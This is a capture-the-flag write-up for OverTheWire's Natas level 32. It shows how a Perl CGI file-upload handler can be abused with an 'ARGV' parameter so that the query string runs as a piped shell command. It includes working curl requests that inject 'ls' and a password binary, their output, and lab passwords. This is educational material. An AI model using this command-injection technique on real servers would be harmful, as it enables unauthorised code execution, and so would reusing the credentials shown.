# Natas Level 32

> Username: natas32

> Password: Rc3837d6qd3KoW0R2IgKssMXRX06btgY

> URL: http://natas32.natas.labs.overthewire.org

## Solution

Entering the URL, we found the same page as the previous level, but there is one additional thing.
`This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.`
So let's view the source code to see if there is any difference.

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;
```

We notice that the code is practically identical to the previous level.
The significant difference is the challenge description:

```text
This time you need to prove that you got code exec.
There is a binary in the webroot that you need to execute.
```

This tells us that simply reading `/etc/natas_webpass/natas33` isn't the objective. We need to execute the provided binary.

So the attack would be like this:
1/ Upload a CSV file. 
2/ Supply `ARGV` as the first `file` parameter.  
3/ Supply a command through the URL query string.
4/ Make Perl interpret the query string as a pipe command.
5/ Execute the challenge binary.

Before executing anything, we need to discover the binary's filename. The binary is called `getpassword`.
We can confirm this by listing the `webroot` directory using the Perl command-execution vulnerability.

First we create the `CSV` file.

```shell
echo -e "name,value\nJake,123" > test.csv
```

Then we send the malicious requests via `curl`.

Let's see if the binary `getpassword` exists first with the query `ls -la .`

```shell
curl -u 'natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY' -F 'file=ARGV' -F 'file=@test.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?ls%20-al%20.%20%7C'
```

```text
</th></tr><tr><td>total 172
</td></tr><tr><td>drwxr-x---  4 natas32 natas32  4096 Oct 25 13:23 .
</td></tr><tr><td>drwxr-xr-x 38 root    root     4096 Oct 25 13:22 ..
</td></tr><tr><td>-rw-r-----  1 natas32 natas32   118 Oct 25 13:22 .htaccess
</td></tr><tr><td>-rw-r-----  1 natas32 natas32    46 Oct 25 13:22 .htpasswd
</td></tr><tr><td>drwxr-x---  5 natas32 natas32  4096 Oct 25 13:23 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx---  1 root    natas32 16088 Oct 25 13:23 getpassword
</td></tr><tr><td>-rw-r--r--  1 root    root     9737 Oct 25 13:23 index-source.html
</td></tr><tr><td>-r-xr-x---  1 natas32 natas32  2968 Oct 25 13:23 index.pl
</td></tr><tr><td>-r-xr-x---  1 natas32 natas32 97180 Oct 25 13:23 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x---  1 natas32 natas32 16877 Oct 25 13:23 sorttable.js
</td></tr><tr><td>drwxr-x---  2 natas32 natas32  4096 Nov  8 18:20 tmp
```

That's it the binary `getpassword` is listed. Now we have to run it with changing the query string to `./getpassword |`.

```shell
curl -u 'natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY' -F 'file=ARGV' -F 'file=@test.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20%7C' | grep -oE '[a-zA-Z0-9]{32}'
```

```text
kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL
```

